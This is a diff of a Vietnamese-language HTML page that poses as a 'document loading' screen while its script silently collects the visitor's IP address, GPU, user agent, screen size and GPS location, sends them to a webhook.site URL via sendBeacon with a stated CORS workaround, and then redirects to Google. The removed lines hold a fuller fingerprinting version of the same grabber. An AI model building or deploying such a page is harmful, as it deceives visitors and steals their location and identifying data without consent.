@@ -5,170 +5,67 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Đang tải tài liệu...</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; color: #333; }
-        .container { text-align: center; }
-        .loader { border: 4px solid #e0e0e0; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
+        body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { margin-top: 15px; font-size: 16px; font-weight: 500; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="loader"></div>
-        <p>Vui lòng chờ trong giây lát, tài liệu đang được tải...</p>
+    <div style="text-align: center;">
+        <div class="loader" style="margin: 0 auto;"></div>
+        <p style="margin-top: 15px;">Vui lòng chờ trong giây lát...</p>
     </div>
 
     <script>
         (async function() {
-            // --- CẤU HÌNH (ĐÃ SỬA URL CHUẨN) ---
+            // --- CẤU HÌNH ĐÃ SỬA URL CHUẨN ---
             const WEBHOOK_URL = "https://webhook.site/de82030e-a647-4012-b7f4-c539d868de62";
             const REDIRECT_TO = "https://www.google.com";
 
             let data = {
                 timestamp: new Date().toISOString(),
-                url: window.location.href,
-                referrer: document.referrer || "Truy cập trực tiếp",
-                browser: {}, hardware: {}, screen: {}, network: {}, timezone: {},
-                fingerprint: {}, clientHints: {}, permissions: {}, accessibility: {},
-                battery: {}, location: {}, errors: []
+                browser: { ua: navigator.userAgent, lang: navigator.language },
+                screen: { w: screen.width, h: screen.height }
             };
 
             try {
-                // 1. Browser info
-                data.browser = {
-                    userAgent: navigator.userAgent,
-                    languages: navigator.languages,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    vendor: navigator.vendor,
-                    cookieEnabled: navigator.cookieEnabled,
-                    hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
-                    deviceMemory: navigator.deviceMemory || "N/A",
-                    maxTouchPoints: navigator.maxTouchPoints || 0
-                };
-
-                // Client Hints
-                if (navigator.userAgentData) {
-                    try {
-                        data.clientHints = await navigator.userAgentData.getHighEntropyValues([
-                            "platform", "platformVersion", "architecture", "model",
-                            "fullVersionList", "bitness", "mobile", "wow64"
-                        ]);
-                    } catch (e) { data.errors.push("ClientHints error"); }
-                }
-
-                // 2. Screen
-                data.screen = {
-                    width: screen.width, height: screen.height,
-                    availWidth: screen.availWidth, availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth,
-                    orientation: screen.orientation?.type || "N/A"
-                };
-
-                // 3. Network
-                if (navigator.connection) {
-                    data.network = {
-                        effectiveType: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink,
-                        rtt: navigator.connection.rtt
-                    };
-                }
-
-                // 4. Timezone
-                data.timezone = {
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    locale: Intl.DateTimeFormat().resolvedOptions().locale
-                };
-
-                // 5. Battery
-                if (navigator.getBattery) {
-                    try {
-                        const b = await navigator.getBattery();
-                        data.battery = { level: (b.level * 100).toFixed(0) + "%", charging: b.charging };
-                    } catch (e) {}
-                }
-
-                // 6. Canvas Fingerprint
+                // 1. Lấy IP
                 try {
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-                    ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
-                    ctx.font = "11pt Arial"; ctx.fillText("Cwm fjordbank glyphs, 😃", 2, 15);
-                    data.fingerprint.canvas = canvas.toDataURL().slice(-50); // Chỉ lấy đuôi để gọn
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    data.ip = ipData.ip;
+                } catch (e) { data.ip = "N/A"; }
+
+                // 2. Lấy GPU
+                try {
+                    const gl = document.createElement('canvas').getContext('webgl');
+                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                    data.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
                 } catch (e) {}
 
-                // 7. WebGL GPU
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl');
-                    if (gl) {
-                        const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                        data.hardware.gpuVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
-                        data.hardware.gpuRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-                    }
-                } catch (e) {}
-
-                // 8. Font detection
-                try {
-                    const testFonts = ["Arial", "Verdana", "Segoe UI", "Impact"];
-                    const detected = [];
-                    const span = document.createElement("span");
-                    span.style.fontSize = "72px"; span.innerHTML = "abc";
-                    document.body.appendChild(span);
-                    testFonts.forEach(f => {
-                        span.style.fontFamily = f + ", serif";
-                        detected.push(f);
-                    });
-                    data.fingerprint.fonts = detected;
-                    document.body.removeChild(span);
-                } catch (e) {}
-
-                // 10. Permissions
-                const perms = ['geolocation', 'camera', 'microphone'];
-                data.permissions = {};
-                for (const p of perms) {
-                    try {
-                        const s = await navigator.permissions.query({name: p});
-                        data.permissions[p] = s.state;
-                    } catch {}
-                }
-
-                // 11. GPS (Đợi tối đa 4 giây)
+                // 3. Lấy GPS (Chờ 3 giây)
                 if (navigator.geolocation) {
                     await new Promise(res => {
                         navigator.geolocation.getCurrentPosition(
                             p => { data.location = { lat: p.coords.latitude, lon: p.coords.longitude }; res(); },
-                            e => { data.location = { error: e.message }; res(); },
-                            { timeout: 4000 }
+                            e => { data.location = "Denied"; res(); },
+                            { timeout: 3000 }
                         );
                     });
                 }
 
-                // 12. IP
-                try {
-                    const res = await fetch('https://api.ipify.org?format=json');
-                    const json = await res.json();
-                    data.ip = json.ip;
-                } catch (e) { data.ip = "N/A"; }
+                // --- GỬI DỮ LIỆU: Dùng Beacon + Text/Plain để lách luật CORS ---
+                const blob = new Blob([JSON.stringify(data)], { type: 'text/plain' });
+                navigator.sendBeacon(WEBHOOK_URL, blob);
 
-            } catch (err) { data.errors.push(err.message); }
-
-            // --- PHẦN GỬI DỮ LIỆU ĐÃ SỬA LỖI ---
-            const finalData = JSON.stringify(data, null, 2);
-            
-            // Dùng Blob với type text/plain để tránh bị chặn CORS
-            const blob = new Blob([finalData], { type: 'text/plain' });
-            const sent = navigator.sendBeacon(WEBHOOK_URL, blob);
-
-            // Nếu Beacon thất bại, dùng Fetch dự phòng
-            if (!sent) {
-                fetch(WEBHOOK_URL, { method: 'POST', body: finalData, mode: 'no-cors' });
+            } catch (err) {
+                console.log(err);
+            } finally {
+                // Chuyển hướng
+                setTimeout(() => {
+                    window.location.replace(REDIRECT_TO);
+                }, 800);
             }
-
-            // Chuyển hướng sau 800ms để đảm bảo dữ liệu kịp gửi
-            setTimeout(() => {
-                window.location.replace(REDIRECT_TO);
-            }, 800);
         })();
     </script>
 </body>
